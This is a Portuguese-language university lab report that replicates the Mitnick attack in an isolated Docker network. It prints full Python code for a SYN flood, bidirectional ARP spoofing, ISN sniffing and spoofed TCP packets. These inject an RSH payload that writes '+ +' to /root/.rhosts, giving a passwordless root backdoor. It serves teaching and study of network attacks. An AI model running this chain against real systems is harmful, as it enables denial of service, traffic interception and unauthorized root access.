# Replicação do Ataque Mitnick (MC833 — Lab 3)

**Disciplina:** MC833 — Programação em Redes de Computadores  
**Turma:** UNICAMP — Instituto de Computação  
**Autor:** Randerson Lemos  
**Data:** Abril de 2026

---

## Sumário

1. [Contexto Histórico](#1-contexto-histórico)
2. [Objetivo do Laboratório](#2-objetivo-do-laboratório)
3. [Topologia da Rede](#3-topologia-da-rede)
4. [Infraestrutura Docker](#4-infraestrutura-docker)
5. [Conceitos Fundamentais](#5-conceitos-fundamentais)
6. [Visão Geral do Fluxo do Ataque](#6-visão-geral-do-fluxo-do-ataque)
7. [Módulos do Código](#7-módulos-do-código)
8. [Desafios e Soluções](#8-desafios-e-soluções)
9. [Como Executar](#9-como-executar)
10. [Verificação do Resultado](#10-verificação-do-resultado)
11. [Referências](#11-referências)

---

## 1. Contexto Histórico

Em 25 de dezembro de 1994, o hacker Kevin Mitnick executou um dos ataques mais sofisticados da história da computação, invadindo os sistemas do pesquisador de segurança Tsutomu Shimomura no San Diego Supercomputer Center. O ataque explorou uma combinação de três técnicas:

- **Negação de Serviço (DoS):** Silenciar um host confiável para que ele não interfira na sessão forjada.
- **IP Spoofing:** Forjar o endereço IP de origem dos pacotes para se passar pelo host confiável.
- **Predição de ISN (Initial Sequence Number):** Prever o número de sequência inicial do TCP para completar o *three-way handshake* sem receber a resposta diretamente.

A inovação histórica do ataque é que Mitnick completou um handshake TCP sem jamais receber o SYN/ACK do alvo — ele *prediu* o ISN. Em 1994 os sistemas Unix geravam ISNs de forma sequencial e previsível. Nesta replicação, o ambiente é adaptado para uma LAN conteinerizada, tornando possível *capturar* o ISN via ARP Spoofing, o que é equivalente conceitualmente mas mais robusto na prática.

---

## 2. Objetivo do Laboratório

Replicar o ataque Mitnick em um ambiente controlado e conteinerizado via Docker, explorando:

1. SYN Flood para esgotar a fila de conexões TCP de um servidor.
2. ARP Spoofing bidirecional para interceptar o tráfego de rede.
3. IP Spoofing com injeção de pacotes na Camada 2 para contornar restrições do kernel Linux.
4. Captura do ISN via sniffing para completar o three-way handshake.
5. Injeção de payload RSH para criar um backdoor root sem senha.

---

## 3. Topologia da Rede

```
Subnet: 10.0.2.0/24 (bridge Docker: mitnick_net)

┌─────────────────────────────────────────────────────┐
│                   Docker Network                     │
│                                                     │
│  ┌──────────────┐    ┌──────────────┐    ┌────────────────┐
│  │   ATACANTE   │    │    ALVO      │    │ SERVIDOR       │
│  │  (mitnick)   │    │  (target)    │    │ CONFIÁVEL      │
│  │ 10.0.2.10    │    │ 10.0.2.20    │    │ (server)       │
│  │              │    │              │    │ 10.0.2.30      │
│  │ Kali Linux   │    │ Ubuntu 22.04 │    │ Ubuntu 22.04   │
│  │              │    │ RSH server   │    │ nc -lk -p 514  │
│  └──────────────┘    └──────────────┘    └────────────────┘
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Papéis dos hosts

| Container | IP | Papel | Serviço |
|---|---|---|---|
| `attacker` | `10.0.2.10` | Atacante — executa o script | Kali Linux + hping3 + scapy + arpspoof |
| `target` | `10.0.2.20` | Vítima — X-Terminal de Shimomura | RSH (porta 514) via xinetd |
| `server` | `10.0.2.30` | Servidor Confiável — impersonado | netcat escutando na 514 |

**Relação de confiança RSH:** O alvo (`10.0.2.20`) possui em seu `/root/.rhosts` a entrada `10.0.2.30 root`, o que significa que qualquer conexão RSH vinda do IP `10.0.2.30` é aceita como root **sem autenticação por senha**.

---

## 4. Infraestrutura Docker

### `docker-compose.yaml`

O ambiente define três serviços em uma rede bridge isolada (`10.0.2.0/24`):

**Container `attacker` (Dockerfile.mitnick):**
- Imagem base: `kalilinux/kali-rolling`
- Roda em modo `privileged` (necessário para manipular ARP e iptables)
- `net.ipv4.ip_forward=0` — desabilita o roteamento para que o container não encaminhe pacotes entre os outros hosts (o ARP Spoofing precisa que o tráfego pare aqui, não que seja roteado)
- Volume: `./mitnick:/app` — o código do ataque é montado em `/app`
- Pacotes instalados: `hping3`, `iptables`, `tcpdump`, `dsniff` (para `arpspoof`), `python3-scapy`

**Container `target`:**
- Imagem base: Ubuntu 22.04
- Inicializa o arquivo `/root/.rhosts` com `10.0.2.30 root` (confiança RSH)
- Sobe o `xinetd` com os serviços RSH (porta 514) e RLOGIN (porta 513) habilitados
- RSH aceita conexões do servidor confiável sem senha

**Container `server`:**
- Imagem base: Ubuntu 22.04
- Executa `nc -lk -p 514` — apenas escuta conexões na porta 514 (simula o servidor confiável)
- `net.ipv4.tcp_syncookies=0` — desabilita SYN cookies, tornando-o vulnerável ao SYN Flood
- `net.ipv4.tcp_abort_on_overflow=0` — mantém conexões pendentes na fila mesmo com overflow

---

## 5. Conceitos Fundamentais

### 5.1 Protocolo RSH (Remote Shell)

O RSH (Remote Shell) é um protocolo legado da era Unix que permite executar comandos remotamente. Sua vulnerabilidade crítica é o mecanismo de autenticação por **confiança de IP**: se o arquivo `/root/.rhosts` contém uma entrada para um IP, qualquer conexão vinda daquele IP é aceita como root sem senha. Não há criptografia nem verificação de identidade real.

**Formato do payload RSH:**
```
<porta-stderr>\x00<usuario-local>\x00<usuario-remoto>\x00<comando>\x00
```

No nosso ataque:
```
b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"
```
- `0` — porta stderr (0 = sem stderr separado)
- `root` — usuário local (do "cliente" forjado)
- `root` — usuário remoto (no servidor alvo)
- `echo + + > /root/.rhosts` — comando injetado: expande o `.rhosts` para aceitar qualquer IP

### 5.2 Three-Way Handshake TCP e ISN

O TCP estabelece conexões via handshake de três vias:

```
Cliente              Servidor
  |                     |
  |--- SYN (seq=X) ---->|   X = ISN do cliente
  |                     |
  |<-- SYN/ACK ---------|   seq=Y (ISN do servidor), ack=X+1
  |   (seq=Y, ack=X+1)  |
  |                     |
  |--- ACK (ack=Y+1) -->|   confirma o ISN do servidor
  |                     |
  |   [Conexão aberta]  |
```

O ISN (Initial Sequence Number) é gerado aleatoriamente pelo kernel para prevenir exatamente este tipo de ataque. Nesta replicação, o ISN é obtido via interceptação ARP — equivalente à predição que Mitnick fez em 1994 com sistemas que usavam ISNs sequenciais.

### 5.3 ARP e ARP Spoofing

O ARP (Address Resolution Protocol) mapeia endereços IP a endereços MAC na camada de enlace. É stateless e sem autenticação: qualquer host pode enviar uma resposta ARP não solicitada (*gratuitous ARP*) e os outros hosts atualizam suas tabelas.

**ARP Spoofing bidirecional:**
```
Atacante envia para ALVO:    "10.0.2.30 está no MAC do Atacante"
Atacante envia para SERVIDOR: "10.0.2.20 está no MAC do Atacante"
```

Resultado: todo tráfego entre alvo e servidor passa pelo atacante (Man-in-the-Middle). O atacante pode então capturar o SYN/ACK que o alvo envia em resposta ao SYN forjado.

### 5.4 SYN Flood

O SYN Flood é um ataque de Negação de Serviço que esgota a **backlog queue** TCP de um servidor. Cada SYN recebido aloca uma entrada na fila de conexões half-open. Quando a fila está cheia, o servidor rejeita novas conexões com RST.

Neste ataque, o SYN Flood é usado no servidor confiável (`10.0.2.30`) para que ele **não envie pacotes RST** ao alvo quando receber o SYN/ACK de uma conexão que ele nunca iniciou. Sem o DoS, o servidor real responderia ao alvo com RST, derrubando nossa sessão forjada antes de completar o handshake.

---

## 6. Visão Geral do Fluxo do Ataque

```
PASSO 0: Preparação do Kernel
─────────────────────────────
Atacante aplica regra iptables para bloquear pacotes RST saindo do próprio kernel.
Sem isso, ao receber um SYN/ACK inesperado, o kernel do atacante enviaria RST
automaticamente, derrubando a sessão forjada.

  iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP


PASSO 1: DoS no Servidor Confiável
────────────────────────────────────
Atacante (10.0.2.10) --[SYN flood com IPs aleatórios]--> Servidor (10.0.2.30:514)

O buffer do servidor fica esgotado. Ele não consegue mais enviar RSTs.


PASSO 2: ARP Spoofing Bidirecional
────────────────────────────────────
Atacante --> Alvo:    ARP Reply "10.0.2.30 = MAC do atacante"
Atacante --> Servidor: ARP Reply "10.0.2.20 = MAC do atacante"

Ambas as tabelas ARP ficam envenenadas. O tráfego alvo<->servidor
agora passa pelo atacante.


PASSO 3: Sniffer em espera
───────────────────────────
Atacante inicia tcpdump filtrando por:
  src=10.0.2.20 && dst=10.0.2.30 && porta=1023 && flags=SYN+ACK

Aguarda o SYN/ACK que o alvo vai enviar após receber nosso SYN forjado.


PASSO 4: SYN Forjado
──────────────────────
Atacante envia (via Scapy, Camada 3):
  IP(src=10.0.2.30, dst=10.0.2.20) / TCP(sport=1023, dport=514, flags='S', seq=123456789)

O alvo acredita que o servidor confiável está iniciando uma conexão RSH.
O alvo responde com SYN/ACK.


PASSO 5: Captura do ISN
─────────────────────────
Como o ARP da rede está envenenado, o SYN/ACK do alvo trafega pelo atacante.
O tcpdump captura o pacote e extrai o ISN (Y) via regex:
  re.search(r"seq (\d+),", output)


PASSO 6: Completar Handshake + Injeção
────────────────────────────────────────
Atacante envia ACK forjado:
  IP(src=10.0.2.30, dst=10.0.2.20) / TCP(flags='A', seq=123456790, ack=Y+1)

Conexão RSH estabelecida!

Atacante envia payload RSH (flags PSH+ACK):
  b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"

O alvo executa o comando como root. O arquivo /root/.rhosts passa a aceitar
conexões de QUALQUER IP sem senha (+ +).


PASSO 7: Backdoor ativo
─────────────────────────
rsh 10.0.2.20 ls -la /root/
# funciona sem senha, a partir de qualquer host
```

---

## 7. Módulos do Código

Esta seção apresenta o código completo de cada módulo com anotações detalhadas explicando cada decisão de implementação.

---

### 7.1 `main.py` — Orquestrador

**Localização:** `mitnick/main.py`

O script central que gerencia o ciclo de vida do ataque. Usa threads Python para coordenar as cinco operações simultâneas (DoS, ARP spoofing, sniffing, SYN forjado e injeção de payload).

#### Constantes de configuração

```python
TRUSTED_SERVER_IP = "10.0.2.30"  # IP que impersonamos; consta no /root/.rhosts do alvo
TARGET_IP         = "10.0.2.20"  # Vítima que roda o RSH via xinetd
RSH_PORT          = 514           # Porta padrão do protocolo RSH
CLIENT_PORT       = 1023          # Porta de origem forjada — deve ser < 1024 (veja abaixo)
INTERFACE         = "eth0"        # NIC do container atacante na bridge Docker
```

**Por que `CLIENT_PORT = 1023`?**
O daemon `in.rshd` exige que a porta de origem do cliente seja um número *privilegiado* (abaixo de 1024). Isso é uma verificação rudimentar de que o chamador possui root no sistema de origem — em Unix clássico, apenas root pode fazer `bind()` em portas abaixo de 1024. Como estamos forjando a identidade do servidor confiável, precisamos satisfazer essa checagem. A porta 1023 é a mais alta dentro da faixa privilegiada e convencionalmente usada em conexões RSH legítimas.

#### Bloqueio de RSTs do próprio kernel

```python
def setup_rst_block():
    run_command([
        "iptables", "-A", "OUTPUT",
        "-p", "tcp", "--tcp-flags", "RST", "RST",
        "-j", "DROP",
    ])
```

**Por que essa regra é indispensável?**
Quando o alvo recebe nosso SYN forjado (com `src=10.0.2.30`), ele responde com um SYN/ACK. Graças ao envenenamento ARP, esse SYN/ACK é entregue fisicamente ao nosso container (`10.0.2.10`), não ao servidor real. Ao receber um SYN/ACK referente a uma conexão que *ele nunca abriu*, o kernel Linux reage automaticamente enviando um pacote RST para o alvo — o que destruiria a sessão forjada no mesmo instante.

A regra `iptables DROP RST` intercepta esse RST antes que ele saia da NIC, preservando a sessão. É o único meio de conter esse comportamento automático do kernel sem recompilar o stack TCP.

```python
def cleanup_rst_block():
    run_command([
        "iptables", "-D", "OUTPUT",   # -D deleta; mesma spec que -A
        "-p", "tcp", "--tcp-flags", "RST", "RST",
        "-j", "DROP",
    ])
```

`-D` com a mesma especificação exata de `-A` garante que apenas *nossa* regra seja removida, sem afetar outras regras de OUTPUT que possam existir no container.

#### Thread do DoS

```python
def dos_thread_func(target_ip, target_port, stop_event):
    process = start_dos_attack(target_ip, target_port)
    stop_event.wait()   # dorme até main() sinalizar fim
    stop_dos_attack(process)
```

**Por que usar `threading.Event` em vez de um loop com `time.sleep()`?**
Um loop com sleep desperdiçaria CPU em polling e atrasaria o encerramento. O `Event.wait()` bloqueia a thread de forma eficiente (sem consumir CPU) e acorda exatamente quando `stop_event.set()` é chamado no bloco `finally`, garantindo encerramento imediato e limpo.

#### Thread do Sniffer e lista compartilhada

```python
def sniffer_thread_func(target_ip, server_ip, client_port, results_list):
    isn = sniff_for_syn_ack(target_ip, server_ip, client_port)
    if isn is not None:
        results_list.append(isn)
```

**Por que uma lista e não um valor de retorno?**
`threading.Thread` não propaga valores de retorno — o valor retornado pela função da thread é simplesmente descartado. Uma lista mutável passada por referência é o padrão idiomático em Python para comunicação de resultado entre threads sem recorrer a `queue.Queue` ou `concurrent.futures`. A lista é segura aqui porque apenas esta thread escreve nela, e `main()` só a lê após o `sniffer_thread.join()`.

#### Fluxo de execução e ordem crítica das operações

```
main()
 │
 ├─[0] setup_rst_block()             # deve vir antes de QUALQUER pacote ser enviado
 │
 ├─[1] Thread: dos_thread (daemon)   # preenche backlog do servidor antes do SYN forjado
 │      └─ time.sleep(1)             # aguarda hping3 saturar a fila
 │
 ├─[2] start_bidirectional_arpspoof()
 │      └─ time.sleep(2)             # aguarda envenenamento ARP propagar nas tabelas dos hosts
 │
 ├─[3] Thread: sniffer_thread        # DEVE iniciar antes do SYN forjado (veja abaixo)
 │      └─ time.sleep(1)             # aguarda tcpdump abrir e compilar o filtro BPF
 │
 ├─[4] send_spoofed_syn()            # dispara o SYN; alvo responde com SYN/ACK
 │
 ├─[5] sniffer_thread.join()         # bloqueia até o ISN ser capturado (ou timeout)
 │
 ├─[6] complete_handshake_and_inject()
 │
 └─[finally]
      stop_arpspoof()       # restaura roteamento normal primeiro
      cleanup_rst_block()   # depois permite RSTs novamente
      stop_dos_event.set()  # por último; servidor pode se recuperar após nosso ataque
```

**Por que o sniffer é iniciado antes do SYN forjado?**
Existe uma janela de tempo muito curta entre o alvo receber o SYN e enviar o SYN/ACK (tipicamente sub-milissegundo na LAN Docker). Se o sniffer não estiver ativo e com o filtro BPF compilado antes do SYN ser enviado, o SYN/ACK pode chegar e ser descartado antes que o tcpdump comece a escutar — e a oportunidade de capturar o ISN seria perdida permanentemente.

**Por que `daemon=True` no dos_thread?**
Uma thread daemon é encerrada automaticamente quando o processo principal termina, sem precisar de `.join()` explícito. Isso é uma rede de segurança: se o `finally` falhar catastroficamente, o hping3 não ficará rodando como órfão.

#### Bloco `finally` e ordem de teardown

```python
finally:
    if arpspoof_processes:
        stop_arpspoof(arpspoof_processes)   # 1º: restaura ARP
    cleanup_rst_block()                     # 2º: permite RSTs
    if dos_thread and dos_thread.is_alive():
        stop_dos_event.set()
        dos_thread.join()                   # 3º: para flood
```

A ordem importa:
1. **ARP primeiro:** restaurar o roteamento permite que os hosts se comuniquem normalmente de novo.
2. **iptables depois:** habilitar RSTs de volta antes de parar o flood seria inócuo, pois o servidor ainda estaria inacessível.
3. **DoS por último:** o servidor só consegue recuperar sua backlog queue depois que o flood para.

---

### 7.2 `attack/dos.py` — SYN Flood

**Localização:** `mitnick/attack/dos.py`

**Papel no ataque:** O servidor confiável (`10.0.2.30`) nunca iniciou a conexão que estamos forjando. Quando o alvo responder ao nosso SYN com um SYN/ACK, esse pacote chegará ao servidor real (se o ARP ainda não estiver totalmente envenenado) ou o servidor verá no estado de sua pilha TCP uma conexão inexistente e enviará RST. O SYN Flood esgota a backlog queue do servidor, fazendo com que ele ignore silenciosamente novas conexões em vez de rejeitá-las com RST.

```python
def start_dos_attack(target_ip, target_port):
    command = [
        "hping3",
        "-S",              # flag SYN: menor pacote TCP válido → máxima taxa de envio
        "-p", str(target_port),
        "--flood",         # desabilita qualquer throttling; envia na velocidade da NIC
        "--rand-source",   # IP de origem aleatório em cada pacote (veja abaixo)
        target_ip,
    ]
    # Popen (não run/call): mantém hping3 vivo em background enquanto o ataque prossegue
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process
```

**Por que `--rand-source` é crítico?**
Se todos os SYNs viessem do mesmo IP (`10.0.2.10`), o servidor poderia:
- Usar SYN cookies (desabilitado via `tcp_syncookies=0` no docker-compose, mas não em produção)
- Retornar RST para aquele IP específico, esvaziando sua entrada da backlog queue

Com IPs aleatórios, cada SYN ocupa uma entrada *diferente* na fila half-open. Não há como o servidor drenar a fila via RST porque as origens são efêmeras e nunca repetem.

**Por que `hping3` e não Scapy para o flood?**
O `hping3` é um binário em C que acessa raw sockets diretamente, sem o overhead de um interpretador. Ele consegue enviar centenas de milhares de pacotes por segundo. Um loop Scapy em Python é limitado pelo GIL e pelo custo de construção e serialização de objetos Python por pacote — ordens de magnitude mais lento. Para saturar uma backlog queue antes que o alvo receba e processe o SYN forjado, velocidade é o requisito central.

```python
def stop_dos_attack(process):
    process.terminate()  # SIGTERM: permite que hping3 libere o socket e finalize stats
    process.wait()       # aguarda encerramento real antes de prosseguir com o cleanup
```

`terminate()` + `wait()` em vez de `kill()`: SIGTERM dá ao hping3 a chance de fechar o raw socket antes de sair. Deixar um raw socket aberto poderia interferir com a regra iptables sendo removida logo depois.

---

### 7.3 `attack/arp_spoof.py` — Envenenamento ARP Bidirecional

**Localização:** `mitnick/attack/arp_spoof.py`

**Papel no ataque:** Para capturar o ISN do alvo precisamos que o SYN/ACK que ele envia (endereçado a `10.0.2.30`) chegue fisicamente ao nosso container. Isso é conseguido envenenando a tabela ARP do alvo para que ele associe o IP `10.0.2.30` ao nosso MAC.

```python
def start_bidirectional_arpspoof(target1_ip, target2_ip, interface="eth0"):
    # Processo 1: diz ao ALVO (10.0.2.20) que o SERVIDOR (10.0.2.30) = nosso MAC
    # Efeito: SYN/ACK do alvo chega ao atacante em vez do servidor real
    cmd1 = ["arpspoof", "-i", interface, "-t", target1_ip, target2_ip]
    p1   = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Processo 2: diz ao SERVIDOR (10.0.2.30) que o ALVO (10.0.2.20) = nosso MAC
    # Efeito: qualquer tráfego que o servidor envie ao alvo passa por nós também,
    # impedindo que o servidor restaure sua entrada correta na tabela ARP do alvo
    cmd2 = ["arpspoof", "-i", interface, "-t", target2_ip, target1_ip]
    p2   = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return [p1, p2]
```

**Por que bidirecional?**
Envenenar apenas o cache do alvo seria *conceitualmente* suficiente para receber o SYN/ACK. O problema é que o servidor real possui sua própria tabela ARP com a entrada correta para o alvo. Quando o servidor envia qualquer tráfego ARP (resolução ou gratuitous reply), o alvo poderia receber e restaurar a entrada correta do servidor, desfazendo nosso envenenamento. Envenenar o servidor no sentido inverso impede esse tráfego de restauração de chegar ao alvo via rota direta.

**Por que o binário `arpspoof` e não um script Scapy?**

A tabela ARP é stateful e possui TTL. Um único `scapy.sendp(ARP(...))` injeta *um* reply falso. Segundos depois, quando o alvo precisar retransmitir qualquer dado para `10.0.2.30`, ele pode revalidar a entrada ARP via broadcast, o servidor real responde, e nosso envenenamento é sobrescrito. Isso é a **ARP Race Condition**.

O binário `arpspoof` envia gratuitous ARP replies *continuamente e em alta frequência* (dezenas por segundo). Por volume e velocidade, nossos replies falsos chegam mais rápido do que os legítimos conseguem restaurar o cache. É uma corrida que vencemos por saturação, não por criatividade.

```python
# stdout/stderr → DEVNULL: o output do arpspoof é verbose e repetitivo;
# descartá-lo mantém o terminal legível sem perder nenhuma informação útil
p1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
```

**Por que `ip_forward=0` no container atacante (sysctl do docker-compose)?**
Com o ARP Spoofing ativo, os pacotes do alvo chegam ao nosso container. Se `ip_forward` estivesse habilitado, o kernel encaminharia esses pacotes ao destino real — funcionando como um roteador transparente, e o SYN/ACK chegaria ao servidor antes que o tcpdump pudesse capturá-lo. Com `ip_forward=0`, o tráfego *para* aqui, dando ao sniffer tempo para extrair o ISN.

```python
def stop_arpspoof(processes):
    for p in processes:
        if p.poll() is None:   # None = processo ainda em execução
            p.terminate()
            p.wait()
```

`p.poll()` retorna `None` se o processo ainda está vivo. Chamar `terminate()` em um processo já encerrado levantaria `OSError` em alguns sistemas. O `poll()` previne esse erro de forma elegante.

---

### 7.4 `attack/sniffer.py` — Captura do ISN via tcpdump

**Localização:** `mitnick/attack/sniffer.py`

**Papel no ataque:** Após enviarmos o SYN forjado, o alvo responde com SYN/ACK contendo seu ISN — gerado aleatoriamente pelo kernel (RFC 6528). Esse valor não pode ser previsto; precisa ser interceptado. Como o ARP Spoofing faz o SYN/ACK chegar ao nosso container, podemos capturá-lo com tcpdump e extrair o ISN para calcular os números de sequência corretos do handshake.

```python
def sniff_for_syn_ack(target_ip, server_ip, client_port, interface="eth0", timeout=10):
    # Filtro BPF: Berkeley Packet Filter, compilado e aplicado no kernel
    # antes de qualquer cópia para userspace — zero-copy filtering
    filter_str = (
        f"src host {target_ip} and dst host {server_ip} "  # alvo → servidor (nosso IP forjado)
        f"and tcp port {client_port} "                      # porta de origem do nosso SYN
        f"and (tcp[tcpflags] & (tcp-syn|tcp-ack)) == (tcp-syn|tcp-ack)"  # flags SYN+ACK
    )
```

**Análise do filtro BPF linha a linha:**

| Cláusula | Significado | Por que é necessária |
|---|---|---|
| `src host 10.0.2.20` | Pacote originado pelo alvo | Filtra tráfego de outros hosts na subnet |
| `dst host 10.0.2.30` | Destinado ao IP que impersonamos | O alvo acredita responder ao servidor real |
| `tcp port 1023` | Porta de origem do SYN forjado | Evita capturar outro tráfego TCP do alvo |
| `tcp[tcpflags] & (SYN\|ACK) == (SYN\|ACK)` | Ambas as flags ativas simultaneamente | Exclui SYNs puros, ACKs puros, FINs, etc. |

A verificação de flags usa operações de bits diretamente no byte de flags TCP (`tcp[13]`). A forma simbólica `tcp-syn|tcp-ack` é equivalente a `0x02|0x10 = 0x12`. A operação `& 0x12 == 0x12` garante que ambas as flags estejam ativas, mas ignora RST, FIN e outras flags.

```python
    command = [
        "tcpdump",
        "-i", interface,  # interface específica: evita ambiguidade em sistemas multi-NIC
        "-l",             # line-buffer: flush após cada linha, permite leitura em tempo real
        "-n",             # sem resolução DNS: elimina latência de lookup reverso
        "-c", "1",        # captura exatamente 1 pacote e encerra: sem polling desnecessário
        filter_str,
    ]
```

**Por que `tcpdump` e não `scapy.sniff()`?**

O `scapy.sniff()` com filtro BPF *também* compila o filtro no kernel, mas adiciona overhead por pacote em Python para a função de callback. Em um cenário onde estamos executando um SYN Flood em paralelo (milhares de pacotes por segundo no segmento de rede), qualquer latência no processamento pode fazer com que o SYN/ACK seja processado tarde demais ou descartado da fila do socket. O `tcpdump` com `-c 1` encerra imediatamente após o primeiro match, minimizando a janela de risco. Sua saída em texto é então parseada com regex — uma operação de custo irrisório comparado à captura em si.

```python
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,             # decodifica bytes → str automaticamente
    )
    # communicate() bloqueia até que tcpdump encerre (-c 1 após match, ou timeout)
    stdout, stderr = process.communicate(timeout=timeout)
```

**Por que `timeout=10`?**
O sniffer é iniciado antes do SYN forjado, com uma pausa de 1 segundo para o tcpdump inicializar. O alvo deve responder com SYN/ACK em menos de 1ms na LAN Docker. Um timeout de 10 segundos é generoso o suficiente para absorver qualquer lentidão de startup do container, mas curto o suficiente para o script falhar rapidamente caso o ARP Spoofing não tenha funcionado.

```python
    # Saída tcpdump típica (Flags [S.] = SYN+ACK):
    # 12:34:56.789 IP 10.0.2.20.1023 > 10.0.2.30.514: Flags [S.], seq 2847361920, ack 123456790, ...
    match = re.search(r"seq (\d+),", stdout)
```

O padrão `seq (\d+),` captura o número de sequência do alvo. A vírgula após os dígitos é um delimitador natural do formato tcpdump que previne matches acidentais em outros campos numéricos (como o `ack` ou o `win`).

```python
    except subprocess.TimeoutExpired:
        # Causas prováveis:
        # 1. ARP Spoofing não propagou: o SYN/ACK foi para o servidor real, não para nós
        # 2. SYN forjado chegou ao alvo com IP de origem errado e foi ignorado
        # 3. Filtro BPF muito restritivo: porta ou IP incorretos na configuração
        process.kill()
        return None
```

Retornar `None` em vez de lançar uma exceção permite que o orquestrador (`main.py`) faça a limpeza normalmente antes de encerrar, em vez de propagar uma exceção que poderia pular o bloco `finally`.

---

### 7.5 `attack/ip_spoofing.py` — Forja de Pacotes TCP e Injeção RSH

**Localização:** `mitnick/attack/ip_spoofing.py`

**Papel no ataque:** Este módulo contém as duas ações mais críticas — o SYN que inicia a sessão forjada e o ACK+payload que planta o backdoor.

#### Camada 2 vs Camada 3 — por que `send()` funciona neste ambiente

O Scapy oferece duas funções de envio:
- `send()` — Camada 3: passa pela pilha de rede do kernel (roteamento, rp_filter)
- `sendp()` — Camada 2: escreve diretamente na interface, bypassando o kernel

Em ambientes com `rp_filter=1` (reverse path filtering ativo), o kernel descartaria pacotes com IP de origem forjado porque o IP `10.0.2.30` não pertence à interface `eth0` do atacante. Nesses casos, `sendp()` com um frame `Ether()` completo seria obrigatório.

Neste ambiente Docker, o `rp_filter` está efetivamente desabilitado na bridge interna e o envenenamento ARP já garante que nosso container é o "dono" do MAC para o IP `10.0.2.30` na visão do alvo. Portanto `send()` (Camada 3) funciona e produz código mais legível.

#### `send_spoofed_syn()` — iniciando o handshake forjado

```python
def send_spoofed_syn(target_ip, spoofed_ip, client_port, server_port):
    # ISN fixo e determinístico: simplifica o cálculo de seq+1 no handshake
    # sem precisar de estado compartilhado entre funções.
    # Em produção, um ISN aleatório seria mais difícil de detectar por assinaturas
    # de IDS (número fixo é uma anomalia), mas para fins de laboratório a
    # reprodutibilidade é mais valiosa.
    spoofed_isn = 123456789

    syn_packet = (
        IP(src=spoofed_ip, dst=target_ip) /   # src=10.0.2.30: impersonamos o servidor
        TCP(
            sport=client_port,   # 1023: porta privilegiada exigida pelo in.rshd
            dport=server_port,   # 514: porta RSH do alvo
            flags="S",           # SYN puro: sem ACK, sem dados
            seq=spoofed_isn,     # nosso ISN conhecido
        )
    )

    send(syn_packet, verbose=0)  # verbose=0: suprime o "Sent 1 packets." do Scapy
    return spoofed_isn           # retorna para que main() passe ao complete_handshake
```

**Por que o ISN é retornado em vez de usar uma constante global?**
Passar o ISN como parâmetro explícito entre `send_spoofed_syn()` e `complete_handshake_and_inject()` deixa o fluxo de dados visível e testável. Uma constante global escondida tornaria mais difícil entender de onde o valor vem ao ler `complete_handshake_and_inject()` isoladamente.

#### `complete_handshake_and_inject()` — ACK, handshake e backdoor

```python
def complete_handshake_and_inject(target_ip, spoofed_ip, client_port, server_port, my_seq, target_isn):
```

**Matemática completa do TCP neste contexto:**

```
Estado inicial após SYN/ACK capturado:
  Nós enviamos:   SYN  seq=123456789
  Alvo respondeu: SYN/ACK  seq=Y (ISN do alvo), ack=123456790

  O TCP trata o SYN como se consumisse 1 byte na stream,
  mesmo sem payload. Por isso ack=123456790 = 123456789 + 1.

Pacote ACK (finaliza handshake):
  seq = 123456789 + 1 = 123456790  ← avança nosso ponteiro após o SYN
  ack = Y + 1                       ← confirma o SYN do alvo

Pacote PSH/ACK (payload RSH):
  seq = 123456790   ← mesmo valor: nenhum byte de dados foi enviado no ACK puro
  ack = Y + 1       ← mesmo valor: não recebemos nada novo do alvo
  payload = b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"
```

```python
    ack_num     = target_isn + 1   # confirma o SYN do alvo
    my_next_seq = my_seq + 1       # avança nosso ponteiro de sequência pós-SYN

    # --- Pacote 1: ACK (completa o three-way handshake) ---
    ack_packet = (
        IP(src=spoofed_ip, dst=target_ip) /
        TCP(
            sport=client_port, dport=server_port,
            flags="A",          # ACK puro, sem dados
            seq=my_next_seq,
            ack=ack_num,
        )
    )
    send(ack_packet, verbose=0)
    # Após este pacote, o alvo considera a conexão TCP estabelecida e entrega
    # o socket ao processo in.rshd, que aguarda o payload do protocolo RSH.
```

```python
    # --- Payload RSH (protocolo definido na RFC 1282) ---
    # Formato wire: <porta-stderr>\x00<user-local>\x00<user-remoto>\x00<cmd>\x00
    #
    # "0"    → porta stderr = 0: não abrir canal separado para stderr
    # "root" → usuário local (quem somos no "cliente" = o servidor confiável)
    # "root" → usuário remoto (com quem queremos executar o comando no alvo)
    # cmd    → "echo + + > /root/.rhosts": sobrescreve o arquivo com a entrada
    #           wildcard "+ +" que aceita qualquer host e qualquer usuário sem senha
    #
    # O null byte final (\x00 após o comando) é obrigatório: sinaliza ao in.rshd
    # o fim da string de comando. Sem ele, o daemon aguardaria mais bytes e o
    # comando nunca seria executado.
    payload = b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"

    # --- Pacote 2: PSH/ACK (entrega o payload ao in.rshd) ---
    push_packet = (
        IP(src=spoofed_ip, dst=target_ip) /
        TCP(
            sport=client_port, dport=server_port,
            flags="PA",         # PSH+ACK: entrega imediata à aplicação + confirmação
            seq=my_next_seq,    # mesmo seq do ACK anterior (nenhum dado foi enviado antes)
            ack=ack_num,
        ) /
        payload
    )
    send(push_packet, verbose=0)
```

**Por que a flag PSH é obrigatória?**
Sem PSH, a pilha TCP do alvo pode optar por manter o dado no buffer de recepção, aguardando mais segmentos antes de entregá-lo à aplicação (algoritmo de Nagle / buffer filling). Com PSH ativo, o kernel do alvo é instruído a entregar imediatamente o conteúdo ao `in.rshd`, sem aguardar o preenchimento do buffer. Como nossa conexão forjada não enviará mais nada depois deste pacote, sem PSH o comando poderia nunca ser executado.

**Por que o comando escolhido é `echo + + > /root/.rhosts`?**
A entrada `+ +` no arquivo `.rhosts` é o wildcard universal do RSH: o `+` no campo de hostname significa "qualquer host" e o `+` no campo de usuário significa "qualquer usuário". Após a injeção, qualquer máquina na rede (incluindo o atacante no IP `10.0.2.10`, que *não* estava na lista original) pode conectar via RSH como root sem senha. O operador `>` (e não `>>`) substitui o arquivo inteiro — mas como o objetivo é acesso irrestrito, perder a entrada original `10.0.2.30 root` é aceitável.

